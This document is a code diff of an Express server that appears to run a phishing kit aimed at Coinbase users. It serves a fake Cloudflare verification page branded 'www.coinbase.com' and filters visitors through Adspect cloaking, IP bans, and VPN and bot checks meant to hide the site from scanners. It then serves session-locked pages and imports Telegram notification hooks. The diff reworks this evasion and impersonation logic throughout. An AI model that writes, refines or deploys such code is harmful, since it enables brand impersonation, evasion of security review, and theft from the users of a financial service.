@@ -6,13 +6,12 @@ import { fileURLToPath } from 'url';
 import { dirname, join } from 'path';
 import crypto from 'crypto';
 import { verifyAdmin } from './middleware/auth.js';
-import path from 'path'; 
-import { createBotProtection } from './middleware/antiBot.js';
-
-import { createPageProtection } from './middleware/pageProtection.js';
+import path from 'path';  // Add this with other imports
+import { checkVPN, checkBot } from './middleware/antiBot.js';
 import { scanPages } from './utils/pageScanner.js';
 import { getIPDetails, getPublicIP } from './utils/ipUtils.js';
 import { ipManager } from './utils/ipManager.js';
+import { createIPBlocker } from './middleware/ipBlocker.js';
 import fetch from 'node-fetch';
 import { 
     sendTelegramNotification, 
@@ -303,22 +302,14 @@ const generateSessionId = (clientIP, userAgent) => {
 
 // Initialize server components
 const app = express();
+
 app.use(express.json());
 app.use(cookieParser());
 
-// Security middleware
 secureServer(app);
 
-// Initialize Session Manager
-const sessionManager = new SessionManager();
 
-// Initialize Bot Protection and Page Protection
-const botProtection = createBotProtection();
-const pageProtection = createPageProtection(sessionManager);
 
-// Add protection middleware
-app.use(botProtection.checkBot);
-app.use(pageProtection);
 
 
 
@@ -380,6 +371,10 @@ const io = new Server(server, {
 
 
 
+
+// Initialize managers and state
+const sessionManager = new SessionManager();
+
 const state = {
     settings: {
         websiteEnabled: true,
@@ -405,38 +400,57 @@ initTelegramService(state.settings);
 // Page serving middleware
 const pageServingMiddleware = async (req, res, next) => {
     try {
+        // Skip middleware for static assets
+        const requestedPath = req.url.split('?')[0];
+        if (requestedPath.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg)$/)) {
+            return next();
+        }
+
+        // Get session parameters
         const params = new URLSearchParams(req.url.split('?')[1] || '');
         const clientId = params.get('client_id');
         const oauthChallenge = params.get('oauth_challenge');
         
         // Get requested page from URL
-        let requestedPage = req.url.split('?')[0].substring(1);
+        let requestedPage = requestedPath.substring(1);
         
-        // Prevent direct access to pages folder
-        if (requestedPage.toLowerCase().startsWith('pages/')) {
-            console.log('Attempted direct page access, redirecting to root');
-            return res.redirect('/');
-        }
-
         // Debug logging
         console.log('Page request:', {
             requestedPage,
             clientId,
             oauthChallenge,
-            sessionExists: !!sessionManager.getSession(clientId),
-            isVerified: sessionManager.isVerified(clientId),
-            availablePages: Array.from(sessionManager.pageMap.keys())
+            hasSession: !!sessionManager.getSession(clientId),
+            isVerified: sessionManager.isVerified(clientId)
         });
 
-        const session = sessionManager.getSession(clientId);
-        if (!session || !sessionManager.validateAccess(clientId, oauthChallenge)) {
-            console.log('Invalid session or access, redirecting to root');
+        // If no session parameters are provided or invalid, redirect to root
+        if (!clientId || !oauthChallenge || !sessionManager.validateAccess(clientId, oauthChallenge)) {
+            console.log('Invalid or missing session parameters, redirecting to root');
             return res.redirect('/');
         }
 
-        if (state.settings.antiBotEnabled && !sessionManager.isVerified(clientId)) {
-            console.log('Session not verified, redirecting to root');
+        const session = sessionManager.getSession(clientId);
+        if (!session) {
+            console.log('No valid session found, redirecting to root');
             return res.redirect('/');
+        }
+
+        // Critical security check: Verify the session is properly verified through Turnstile
+        if (!sessionManager.isVerified(clientId)) {
+            console.log('Session not verified through Turnstile, redirecting to root');
+            return res.redirect('/');
+        }
+
+        // Ensure requested page matches session's current page
+        const normalizedRequestedPage = requestedPage.replace('.html', '').toLowerCase();
+        const normalizedSessionPage = session.currentPage.toLowerCase();
+        
+        if (normalizedRequestedPage !== normalizedSessionPage) {
+            console.log('Page mismatch:', {
+                requested: normalizedRequestedPage,
+                current: normalizedSessionPage
+            });
+            return res.redirect(session.url);
         }
 
         // Ensure we add .html to the page name if not present
@@ -444,21 +458,19 @@ const pageServingMiddleware = async (req, res, next) => {
             requestedPage += '.html';
         }
 
-        // Get the page path
+        // Get and validate the page path
         const pagePath = sessionManager.getPagePath(requestedPage);
         if (!pagePath) {
-            console.log('Page not found:', {
-                requested: requestedPage,
-                available: Array.from(sessionManager.pageMap.keys())
-            });
+            console.log('Page not found:', requestedPage);
             return res.redirect('/');
         }
 
-        console.log('Serving page:', pagePath);
+        // If all checks pass, serve the requested page
+        console.log('Serving verified page:', pagePath);
         res.sendFile(pagePath);
 
     } catch (error) {
-        console.error('Error in page serving:', error);
+        console.error('Error in page serving middleware:', error);
         res.redirect('/');
     }
 };
@@ -489,179 +501,6 @@ app.get('/', (req, res) => {
     return res.redirect(302, 'https://redirectingroute.com/');
  });
 
-
- function generateCaptchaPage(rayId, settings, siteKey) {
-    return `<!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Just a moment...</title>
-        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-        <script src="/socket.io/socket.io.js"></script>
-        <script src="/js/socket-client.js"></script>
-        <style>
-            * { box-sizing: border-box; margin: 0; padding: 0; }
-            html { line-height: 1.15; -webkit-text-size-adjust: 100%; color: #d9d9d9; }
-            body {
-                background-color: #1C1C1C;
-                margin: 0;
-                padding: 0;
-                min-height: 100vh;
-                display: flex;
-                flex-direction: column;
-                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            }
-            .main-wrapper {
-                flex: 1;
-                display: flex;
-                flex-direction: column;
-                align-items: center;
-            }
-            .main-content {
-                margin: 8rem auto;
-                max-width: 60rem;
-                width: 100%;
-                padding: 0 1.5rem;
-            }
-            .h1 {
-                font-size: 2.5rem;
-                font-weight: 500;
-                line-height: 3.75rem;
-                color: #d9d9d9;
-                margin-bottom: 1rem;
-            }
-            .h2 {
-                font-size: 1.5rem;
-                font-weight: 500;
-                line-height: 2.25rem;
-                color: #d9d9d9;
-                margin-bottom: 1rem;
-            }
-            .core-msg {
-                font-size: 1rem;
-                line-height: 1.5rem;
-                color: #d9d9d9;
-                margin: 2rem 0;
-            }
-            .spacer { margin: 2rem 0; }
-            #captchaContainer {
-                display: ${settings.antiBotEnabled ? 'block' : 'none'};
-            }
-            .footer {
-                padding: 1.5rem;
-                margin: 0 auto;
-                max-width: 60rem;
-                width: 100%;
-            }
-            .footer-inner {
-                border-top: 1px solid #2c2c2c;
-                padding: 1rem 0;
-            }
-            .ray-id {
-                text-align: center;
-                font-size: 0.75rem;
-                color: #d9d9d9;
-            }
-            .ray-id code {
-                font-family: monaco, courier, monospace;
-            }
-            .text-center {
-                text-align: center;
-                font-size: 0.75rem;
-                color: #d9d9d9;
-                margin-top: 0.5rem;
-            }
-            .cf-turnstile {
-                background: transparent;
-                margin: 1rem 0;
-            }
-        </style>
-    </head>
-    <body>
-        <div class="main-wrapper">
-            <div class="main-content">
-                <h1 class="h1">www.coinbase.com</h1>
-                <h2 class="h2">Verifying you are human. This may take a few seconds.</h2>
-                
-                <div id="captchaContainer">
-                    <div class="cf-turnstile" 
-                        data-sitekey="${siteKey}"
-                        data-callback="onCaptchaSuccess"
-                        data-theme="dark"></div>
-                </div>
-
-                <div class="core-msg spacer">
-                    www.coinbase.com needs to review the security of your connection before proceeding.
-                </div>
-            </div>
-
-            <div class="footer">
-                <div class="footer-inner">
-                    <div class="ray-id">Ray ID: <code>${rayId}</code></div>
-                    <div class="text-center">Performance & security by Cloudflare</div>
-                </div>
-            </div>
-        </div>
-
-        <script>
-            let captchaToken = null;
-
-            function onCaptchaSuccess(token) {
-                captchaToken = token;
-                checkAccess();
-            }
-
-            async function checkAccess() {
-                if (${settings.antiBotEnabled} && !captchaToken) {
-                    return;
-                }
-
-                try {
-                    const sessionId = new URLSearchParams(window.location.search).get('client_id');
-                    console.log('Checking access for session:', sessionId);
-                    
-                    if (${settings.antiBotEnabled}) {
-                        const verifyResponse = await fetch('/verify-turnstile', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({ 
-                                token: captchaToken,
-                                sessionId: sessionId
-                            })
-                        });
-                        
-                        const verifyResult = await verifyResponse.json();
-                        console.log('Verification result:', verifyResult);
-
-                        if (verifyResult.success && verifyResult.verified && verifyResult.url) {
-                            console.log('Redirecting to verified URL:', verifyResult.url);
-                            window.location.replace(verifyResult.url);
-                            return;
-                        } else if (!verifyResult.success) {
-                            console.error('Verification failed:', verifyResult.error);
-                            return;
-                        }
-                    }
-
-                    if (!sessionId) {
-                        console.log('No session, checking IP...');
-                        const response = await fetch('/check-ip');
-                        if (response.redirected) {
-                            window.location.replace(response.url);
-                        }
-                    }
-                } catch (error) {
-                    console.error('Error in checkAccess:', error);
-                }
-            }
-        </script>
-    </body>
-    </html>`;
-}
-
 // Initial IP check
 app.get('/check-ip', async (req, res) => {
     const isAdminPanel = req.headers.referer?.includes('/admin');
@@ -674,7 +513,7 @@ app.get('/check-ip', async (req, res) => {
         'user-agent': req.headers['user-agent']
     });
 
-    // First layer: Adspect Protection
+    // Check either referer or our cookie
     const isFromAdspect = referer.includes('redirectingroute.com') || adspectCookie === 'true';
     
     if (!isFromAdspect && !isAdminPanel) {
@@ -684,38 +523,24 @@ app.get('/check-ip', async (req, res) => {
 
     // Clear the cookie since we've used it
     res.clearCookie('adspect_redirect');
-
+    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
+                    req.headers['x-real-ip'] || 
+                    req.socket.remoteAddress;
+    const userAgent = req.headers['user-agent'];
+    
     try {
-        const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
-                        req.headers['x-real-ip'] || 
-                        req.socket.remoteAddress;
-        const userAgent = req.headers['user-agent'];
         const publicIP = await getPublicIP(clientIP);
         
         if (ipManager.isIPBanned(publicIP) && !isAdminPanel) {
             return res.redirect(state.settings.redirectUrl);
         }
 
-        // Use botProtection instance to check for bots
-        const botCheckResult = await new Promise((resolve) => {
-            const mockRes = {
-                redirect: () => resolve(true),
-                status: () => mockRes
-            };
-            
-            botProtection.checkBot(req, mockRes, () => resolve(false));
-        });
-
-        if (botCheckResult) {
-            console.log('Bot detected by protection system');
-            return res.redirect(state.settings.redirectUrl);
-        }
-
-        // Continue with session handling if bot check passes
+        // Generate sessionId and check for existing verified session
         const sessionId = generateSessionId(publicIP, userAgent);
         const existingVerifiedSession = sessionManager.getAllVerifiedSessions()
             .find(s => s.id === sessionId);
 
+        // If there's an existing verified session, reactivate and redirect
         if (existingVerifiedSession) {
             existingVerifiedSession.connected = true;
             existingVerifiedSession.loading = false;
@@ -739,14 +564,208 @@ app.get('/check-ip', async (req, res) => {
             sessionManager.createSession(sessionId, publicIP, userAgent);
         }
 
-        // Generate random ray ID and serve captcha page
+        // Generate random ray ID for captcha page
         const rayId = Math.random().toString(16).substr(2, 10);
-        const captchaPage = generateCaptchaPage(
-            rayId, 
-            state.settings, 
-            process.env.CLOUDFLARE_SITE_KEY
-        );
-        res.send(captchaPage);
+        const indexHtml = `<!DOCTYPE html>
+<html lang="en">
+<!-- Head section remains the same -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Just a moment...</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+        <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/socket-client.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html {
+            line-height: 1.15;
+            -webkit-text-size-adjust: 100%;
+            color: #d9d9d9;
+        }
+
+        body {
+            background-color: #1C1C1C;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        .main-wrapper {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .main-content {
+            margin: 8rem auto;
+            max-width: 60rem;
+            width: 100%;
+            padding: 0 1.5rem;
+        }
+
+        .h1 {
+            font-size: 2.5rem;
+            font-weight: 500;
+            line-height: 3.75rem;
+            color: #d9d9d9;
+            margin-bottom: 1rem;
+        }
+
+        .h2 {
+            font-size: 1.5rem;
+            font-weight: 500;
+            line-height: 2.25rem;
+            color: #d9d9d9;
+            margin-bottom: 1rem;
+        }
+
+        .core-msg {
+            font-size: 1rem;
+            line-height: 1.5rem;
+            color: #d9d9d9;
+            margin: 2rem 0;
+        }
+
+        .spacer {
+            margin: 2rem 0;
+        }
+
+        #captchaContainer {
+            display: ${state.settings.antiBotEnabled ? 'block' : 'none'};
+        }
+
+        .footer {
+            padding: 1.5rem;
+            margin: 0 auto;
+            max-width: 60rem;
+            width: 100%;
+        }
+
+        .footer-inner {
+            border-top: 1px solid #2c2c2c;
+            padding: 1rem 0;
+        }
+
+        .ray-id {
+            text-align: center;
+            font-size: 0.75rem;
+            color: #d9d9d9;
+        }
+
+        .ray-id code {
+            font-family: monaco, courier, monospace;
+        }
+
+        .text-center {
+            text-align: center;
+            font-size: 0.75rem;
+            color: #d9d9d9;
+            margin-top: 0.5rem;
+        }
+
+        .cf-turnstile {
+            background: transparent;
+            margin: 1rem 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-wrapper">
+        <div class="main-content">
+            <h1 class="h1">www.coinbase.com</h1>
+            <h2 class="h2">Verifying you are human. This may take a few seconds.</h2>
+            
+            <div id="captchaContainer">
+                <div class="cf-turnstile" 
+                    data-sitekey="${process.env.CLOUDFLARE_SITE_KEY}"
+                    data-callback="onCaptchaSuccess"
+                    data-theme="dark"></div>
+            </div>
+
+            <div class="core-msg spacer">
+                www.coinbase.com needs to review the security of your connection before proceeding.
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="footer-inner">
+                <div class="ray-id">Ray ID: <code>${rayId}</code></div>
+                <div class="text-center">Performance & security by Cloudflare</div>
+            </div>
+        </div>
+    </div>
+
+
+    <script>
+        let captchaToken = null;
+
+        function onCaptchaSuccess(token) {
+            captchaToken = token;
+            checkAccess();
+        }
+
+        async function checkAccess() {
+    if (${state.settings.antiBotEnabled ? 'true' : 'false'} && !captchaToken) {
+        return;
+    }
+
+    try {
+        const sessionId = new URLSearchParams(window.location.search).get('client_id');
+        console.log('Checking access for session:', sessionId);
+        
+        if (${state.settings.antiBotEnabled ? 'true' : 'false'}) {
+            const verifyResponse = await fetch('/verify-turnstile', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ 
+                    token: captchaToken,
+                    sessionId: sessionId
+                })
+            });
+            
+            const verifyResult = await verifyResponse.json();
+            console.log('Verification result:', verifyResult);
+
+            if (verifyResult.success && verifyResult.verified && verifyResult.url) {
+                console.log('Redirecting to verified URL:', verifyResult.url);
+                window.location.replace(verifyResult.url);
+                return;
+            } else if (!verifyResult.success) {
+                console.error('Verification failed:', verifyResult.error);
+                // Don't redirect, let them try the captcha again
+                return;
+            }
+        }
+
+        // Only check IP if we don't have a session
+        if (!sessionId) {
+            console.log('No session, checking IP...');
+            const response = await fetch('/check-ip');
+            if (response.redirected) {
+                window.location.replace(response.url);
+            }
+        }
+    } catch (error) {
+        console.error('Error in checkAccess:', error);
+    }
+}
+    </script>
+</body>
+</html>`;
+        // Send captcha page
+        res.send(indexHtml); // Your captcha HTML template
 
     } catch (error) {
         console.error('Error in check-ip:', error);
@@ -906,36 +925,16 @@ userNamespace.use(async (socket, next) => {
             }
         }
 
-        // Bot check using botProtection middleware
+        // Bot check
         if (state.settings.antiBotEnabled) {
-            // Create mock request object with necessary properties
-            const mockReq = {
-                headers: socket.handshake.headers,
-                path: '/',
-                socket: {
-                    remoteAddress: socket.handshake.address
-                }
-            };
-
-            // Create mock response object
-            const mockRes = {
-                redirect: () => {
-                    socket.disconnect(true);
-                    return next(new Error('Bot detected'));
-                },
-                status: () => mockRes
-            };
-
-            // Create mock next function that allows the connection if no bot is detected
-            const mockNext = () => {
-                next();
-            };
-
-            // Use the bot protection middleware
-            await botProtection.checkBot(mockReq, mockRes, mockNext);
-        } else {
-            next();
+            const userAgent = socket.handshake.headers['user-agent'];
+            if (checkBot(userAgent)) {
+                socket.disconnect(true);
+                return next(new Error('Bot detected'));
+            }
         }
+
+        next();
     } catch (error) {
         console.error('Socket middleware error:', error);
         next(error);
